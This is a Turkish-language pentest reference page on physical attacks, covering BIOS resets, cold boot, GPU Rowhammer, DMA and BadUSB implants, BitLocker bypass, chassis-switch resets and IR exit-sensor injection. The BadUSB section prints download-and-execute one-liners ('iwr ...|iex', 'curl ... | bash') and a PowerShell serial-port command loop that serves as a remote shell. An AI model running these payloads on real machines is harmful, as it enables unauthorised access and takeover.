# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**BIOS'u sıfırlama** birkaç şekilde gerçekleştirilebilir. Çoğu anakart, yaklaşık **30 dakika** çıkarıldığında BIOS ayarlarını, parola dahil, sıfırlayan bir **pil** içerir. Alternatif olarak, belirli pinleri bağlayarak bu ayarları sıfırlamak için anakart üzerindeki bir **jumper** ayarlanabilir.

Donanım değişikliklerinin mümkün olmadığı veya pratik olmadığı durumlarda, **software araçları** bir çözüm sunar. **Kali Linux** gibi dağıtımlarla bir **Live CD/USB** üzerinden sistem çalıştırmak, BIOS parola recovery'sine yardımcı olabilecek **_killCmos_** ve **_CmosPWD_** gibi araçlara erişim sağlar.

BIOS parolasının bilinmediği durumlarda, parolayı **üç kez** yanlış girmek genellikle bir hata kodu üretir. Bu kod, [https://bios-pw.org](https://bios-pw.org) gibi web sitelerinde kullanılabilir ve potansiyel olarak kullanılabilir bir parola elde etmeye yardımcı olabilir.

### UEFI Security

**UEFI** kullanan modern sistemlerde, geleneksel BIOS yerine, **chipsec** aracı UEFI ayarlarını analiz etmek ve değiştirmek için kullanılabilir; buna **Secure Boot**'un devre dışı bırakılması da dahildir. Bu işlem aşağıdaki komutla gerçekleştirilebilir:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analizi ve Cold Boot Attacks

RAM, güç kesildikten sonra veriyi kısa süreliğine tutar; genellikle **1 ila 2 dakika**. Bu kalıcılık, sıvı nitrojen gibi soğuk maddeler uygulanarak **10 dakika**ya kadar uzatılabilir. Bu uzatılmış süre içinde, **dd.exe** ve **volatility** gibi araçlar kullanılarak analiz için bir **memory dump** oluşturulabilir.

---

## Page Tables'a Karşı GPU Rowhammer

Modern GPU Rowhammer attacks, hedef olarak sıradan tamponlar yerine **GPU virtual-memory metadata** kullandıklarında çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPUs** üzerindeki yakın tarihli çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU'ya özgü hammering patterns oluşturabildiğini, paging structures'ı savunmasız satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya ara bir **page directory** içinde bit flip yapabildiğini gösterir. Tek bir translation entry bozulduğunda, saldırgan **arbitrary GPU memory read/write** yeteneğini başlatabilir ve ardından host compromise'a geçebilir.

### Exploitation Pattern

1. GDDR6 içindeki **profile hammerable rows** ve in-DRAM mitigations'ı aşan, refresh-aware / non-uniform hammering patterns oluştur.
2. Driver'ın page-translation structures'ı varsayılan korumalı havuzda tutmak yerine hammerable fiziksel konumlara yerleştirmesi için **GPU allocations** üzerinde **massage** uygula. Pratikte bu, low-memory page-table region'ını tüketmek ve kontrollü strides ile büyük sparse UVM mappings yaymak anlamına gelebilir.
3. Bir page-table / page-directory entry içindeki **PFN** veya aperture ile ilgili bitler gibi translation metadata'yı flip et; böylece saldırgan kontrollü virtual page, page-table pages, arbitrary GPU memory veya host-visible system mappings olarak çözümlenir.
4. Sahte mapping'i yeniden kullanarak ek translation entries'i yeniden yaz ve GPU contexts genelinde **arbitrary GPU memory read/write** seviyesine yüksel.

### Host Pivot ve Mitigations

- **IOMMU disabled** iken, sahte system-aperture mappings GPU'ya arbitrary **host physical memory** açığa çıkarabilir ve GPU primitive'ini tam host compromise'a dönüştürebilir.
- **GDDRHammer** last-level page-table entries'i hedeflerken, **GeForge** bir page-directory level'ını bozmanın daha kolay olabildiğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'yi yeniden hedefleyebilir. Yalnızca bir paging layer'ını security-critical olarak görme.
- **IOMMU** hâlâ önemlidir; çünkü GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory yolunu engeller, ancak **tam bir mitigation değildir**. **GPUBreach**, saldırganın GPU-writable, driver-owned CPU buffers'ı bozduğu ve ardından NVIDIA driver memory-safety bugs'ını tetikleyerek IOMMU etkin olsa bile bir kernel write primitive ve **root shell** elde ettiği ikinci aşama bir pivot gösterir.
- Desteklenen workstation/server GPUs üzerinde **System-level ECC** pratik bir hardening adımıdır. ECC olmayan consumer GPUs daha zayıf bir defense surface açar.
- Bu attacks tamamen teorik değildir: **GeForge**, bir RTX 3060 üzerinde **1.171** bit flip ve bir RTX A6000 üzerinde **202** bit flip bildirmiştir; bu da çalışan bir host-privilege-escalation chain oluşturmak için yeterliydi.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION**, **FireWire** ve **Thunderbolt** gibi arayüzlerle uyumlu, **DMA** üzerinden **physical memory manipulation** için tasarlanmış bir araçtır. Belleği yama yaparak herhangi bir şifreyi kabul edecek şekilde değiştirip oturum açma prosedürlerini atlatmaya izin verir. Ancak **Windows 10** sistemlerine karşı etkisizdir.

---

## Sistem Erişimi için Live CD/USB

**_sethc.exe_** veya **_Utilman.exe_** gibi sistem binary'lerini **_cmd.exe_** kopyasıyla değiştirmek, system privileges ile bir command prompt sağlayabilir. **chntpw** gibi araçlar, Windows kurulumunun **SAM** dosyasını düzenlemek için kullanılabilir ve bu da şifre değişikliklerine izin verir.

**Kon-Boot**, Windows kernel veya UEFI'yi geçici olarak değiştirerek şifreyi bilmeden Windows sistemlerine giriş yapmayı kolaylaştıran bir araçtır. Daha fazla bilgi [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) adresinde bulunabilir.

---

## Windows Security Features ile Başa Çıkma

### Boot ve Recovery Kısayolları

- **Supr**: BIOS ayarlarına eriş.
- **F8**: Recovery mode'a gir.
- Windows banner'ından sonra **Shift** tuşuna basmak autologon'u atlatabilir.

### BAD USB Devices

**Rubber Ducky** ve **Teensyduino** gibi cihazlar, hedef bilgisayara bağlandıklarında önceden tanımlı payloads çalıştırabilen **bad USB** devices oluşturmak için platform görevi görür.

### Volume Shadow Copy

Administrator privileges, **SAM** dosyası da dahil olmak üzere hassas dosyaların kopyalarının PowerShell üzerinden oluşturulmasına izin verir.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implants, USB-A→USB-C veya USB-C↔USB-C kablolarının içine gizlenir, yalnızca bir USB keyboard olarak enumerate olur ve C2 stack'ini Wi-Fi üzerinden sunar. Operatörün tek yapması gereken kabloyu kurban host'tan beslemek, `Evil Crow Cable Wind` adlı ve şifresi `123456789` olan bir hotspot oluşturmak ve gömülü HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) adresine (veya DHCP address'ine) gitmektir.
- Browser UI, *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmeleri sağlar. Saklanan payloads OS başına etiketlenir, keyboard layouts anında değiştirilir ve VID/PID strings bilinen peripherals'ı taklit edecek şekilde değiştirilebilir.
- C2 kablonun içinde yaşadığı için, bir telefon payloads hazırlayabilir, execution tetikleyebilir ve Wi-Fi credentials'ı host OS'e dokunmadan yönetebilir—kısa süreli physical intrusion'lar için idealdir.

### OS-aware AutoExec payloads

- AutoExec kuralları, USB enumeration'dan hemen sonra çalışacak bir veya daha fazla payload'ı bağlar. Implant hafif OS fingerprinting yapar ve eşleşen script'i seçer.
- Örnek workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution gözetimsiz olduğu için, sadece bir şarj kablosunu değiştirmek, logged-on user context altında “plug-and-pwn” initial access sağlayabilir.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Saklanan bir payload bir console açar ve yeni USB serial device üzerinde gelen her şeyi çalıştıran bir loop yapıştırır. Minimal bir Windows varyantı şudur:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3 bir TCP client (Python script, Android APK veya desktop executable) başlatır ve bunu operatöre geri bağlar. TCP session içinde yazılan herhangi bir byte, yukarıdaki serial loop’a iletilir; böylece air-gapped host’larda bile remote command execution sağlanır. Output sınırlıdır, bu yüzden operatörler genellikle blind commands çalıştırır (account creation, additional tooling staging vb.).

### HTTP OTA update surface

- Aynı web stack genellikle unauthenticated firmware updates sunar. Evil Crow Cable Wind `/update` üzerinde dinler ve upload edilen herhangi bir binary’yi flash eder:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators, kabloyu açmadan görev sırasında özellikleri hot-swap yapabilirler (örn. flash USB Army Knife firmware), böylece implant hedef host’a takılı kalmışken yeni yeteneklere pivot edebilir.

## BitLocker Encryption Bypass Etme

BitLocker encryption, **recovery password** bir memory dump dosyası (**MEMORY.DMP**) içinde bulunursa potansiyel olarak bypass edilebilir. Bu amaçla **Elcomsoft Forensic Disk Decryptor** veya **Passware Kit Forensic** gibi tools kullanılabilir.

---

## Recovery Key Ekleme için Social Engineering

Yeni bir BitLocker recovery key, bir kullanıcının yeni bir recovery key ekleyen ve sıfırlardan oluşan bir command çalıştırmasını sağlayacak şekilde social engineering taktikleriyle eklenebilir; böylece decryption süreci basitleştirilir.

---

## Chassis Intrusion / Maintenance Switches’i Kullanarak BIOS’u Factory-Reset Yapma

Birçok modern laptop ve small-form-factor desktop, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** içerir. Switch’in temel amacı bir cihaz açıldığında alarm vermek olsa da, vendor’lar bazen switch belirli bir pattern ile toggleda edildiğinde tetiklenen **undocumented recovery shortcut** uygular.

### Saldırı Nasıl Çalışır

1. Switch, EC üzerindeki bir **GPIO interrupt**’ına bağlıdır.
2. EC üzerinde çalışan firmware, **timing** ve basış sayısını takip eder.
3. Sabit kodlanmış bir pattern tanındığında, EC sistem NVRAM/CMOS içeriğini **silip temizleyen** bir *mainboard-reset* routine çağırır.
4. Sonraki boot’ta BIOS varsayılan değerleri yükler – **supervisor password, Secure Boot keys ve tüm custom configuration temizlenir**.

> Secure Boot devre dışı kaldığında ve firmware password artık olmadığında, attacker herhangi bir external OS image’i boot edebilir ve internal drives üzerinde kısıtlamasız access elde edebilir.

### Gerçek Dünya Örneği – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) için recovery shortcut şudur:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Onuncu döngüden sonra EC, BIOS’a bir sonraki yeniden başlatmada NVRAM’i silmesini söyleyen bir bayrak ayarlar. Tüm prosedür ~40 s sürer ve **bir tornavida dışında hiçbir şey** gerektirmez.

### Genel İstismar Prosedürü

1. EC çalışıyor olsun diye hedefi açın veya uyku-kalk yapın.
2. İzinsiz giriş/bakım anahtarını görünür kılmak için alt kapağı çıkarın.
3. Satıcıya özgü toggle pattern’i yeniden üretin (dokümantasyona, forumlara bakın veya EC firmware’ini reverse-engineer edin).
4. Yeniden monte edin ve reboot edin – firmware protections devre dışı kalmış olmalı.
5. Bir live USB (örn. Kali Linux) ile boot edin ve olağan post-exploitation işlemlerini gerçekleştirin (credential dumping, data exfiltration, kötü amaçlı EFI binary’leri yerleştirme, vb.).

### Tespit & Azaltma

* Chassis-intrusion olaylarını OS management console’da loglayın ve beklenmeyen BIOS resets ile ilişkilendirin.
* Açılmayı tespit etmek için vidalar/kapaklar üzerinde **tamper-evident seals** kullanın.
* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam compromise anlamına geldiğini varsayın.
* Mümkünse, satıcının “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM resets için ek bir kriptografik authorization zorunlu kılın.

---

## No-Touch Exit Sensörlerine Karşı Gizli IR Injection

### Sensör Özellikleri
- Yaygın “wave-to-exit” sensörler, yakın IR LED emitter ile TV-remote tarzı bir receiver module eşleştirir; bu modül yalnızca doğru carrier’ın birden çok pulse’ını (~4–10) gördükten sonra logic high bildirir (≈30 kHz).
- Plastik bir shroud, emitter ve receiver’ın birbirini doğrudan görmesini engeller; bu yüzden controller, doğrulanmış herhangi bir carrier’ın yakındaki bir yansımadan geldiğini varsayar ve door strike’ı açan bir relay sürer.
- Controller bir target var olduğuna inandığında çoğu zaman outbound modulation envelope’u değiştirir, ancak receiver filtrelenmiş carrier’a uyan herhangi bir burst’ü kabul etmeye devam eder.

### Saldırı İş Akışı
1. **Emission profile’ı yakala** – controller pinleri üzerine bir logic analyser bağlayarak iç IR LED’i süren pre-detection ve post-detection waveform’larının ikisini de kaydet.
2. **Sadece “post-detection” waveform’ünü yeniden oynat** – stok emitter’ı çıkarın/görmezden gelin ve dış bir IR LED’i, baştan beri zaten tetiklenmiş pattern ile sürün. Receiver yalnızca pulse sayısı/frequency ile ilgilendiği için, sahte carrier’ı gerçek bir reflection olarak yorumlar ve relay line’ı assert eder.
3. **Transmission’ı gate et** – carrier’ı ayarlı burst’ler halinde gönderin (örn. onlarca milisaniye açık, benzeri süre kapalı) ki receiver’ın AGC’sini veya interference handling logic’ini doygunluğa sokmadan minimum pulse sayısı sağlansın. Sürekli emission, sensörü hızla duyarsızlaştırır ve relay’in tetiklenmesini durdurur.

### Uzun Mesafe Reflective Injection
- Bench LED’yi yüksek güçlü bir IR diode, MOSFET driver ve odaklama optiği ile değiştirmek, ~6 m uzaktan güvenilir tetiklemeyi mümkün kılar.
- Saldırganın receiver aperture’ına doğrudan line-of-sight ihtiyacı yoktur; ışını camdan görülebilen iç duvarlara, raflara veya kapı kasalarına yöneltmek, yansıyan enerjinin ~30° field of view içine girmesini sağlar ve yakın mesafe el sallamayı taklit eder.
- Receiver’lar yalnızca zayıf yansımalar beklediği için, çok daha güçlü bir dış ışın birden çok yüzeyden sekebilir ve yine de detection threshold üzerinde kalabilir.

### Silahlandırılmış Saldırı Feneri
- Driver’ı ticari bir el fenerinin içine gömmek, aracı sıradan bir eşya gibi gizler. Görünür LED’i, receiver’ın bandıyla uyumlu yüksek güçlü bir IR LED ile değiştirin, ≈30 kHz burst’ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını sink etmek için bir MOSFET kullanın.
- Teleskopik zoom lens, range/precision için ışını daraltır; MCU kontrolündeki vibration motor ise görünür ışık yaymadan modülasyonun aktif olduğuna dair haptic confirmation verir.
- Birkaç saklı modulation pattern’i arasında geçiş yapmak (biraz farklı carrier frequency ve envelope’lar) yeniden markalanmış sensor aileleri arasında uyumluluğu artırır; böylece operatör, relay sesli olarak klikleyip kapı açılana kadar yansıtıcı yüzeyleri tarayabilir.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
